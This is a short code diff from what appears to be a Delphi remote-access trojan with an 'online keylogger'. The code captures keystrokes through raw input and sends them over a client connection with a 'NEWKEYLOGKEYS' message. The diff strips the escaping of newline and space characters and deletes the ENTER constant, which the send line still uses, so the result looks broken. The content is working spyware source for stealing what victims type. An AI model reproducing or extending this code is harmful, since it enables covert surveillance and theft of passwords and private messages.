@@ -28,7 +28,6 @@ const
 
 const
   WM_INPUT  = $00FF;
-  ENTER     = #10;
 const
   RIDEV_REMOVE                = $00000001;
   RIDEV_EXCLUDE               = $00000010;
@@ -358,9 +357,6 @@ begin
         lasttickcounton := GetTickCount();
           if(OnlineKeyloggerKeys <> '') then //Teclas nuevas del online keylogger :D
           begin
-            OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
-            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
-            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim( final
             if(Cliente.Connected) then
               Cliente.SendString('NEWKEYLOGKEYS|'+OnlineKeyloggerKeys+ ENTER)
             else
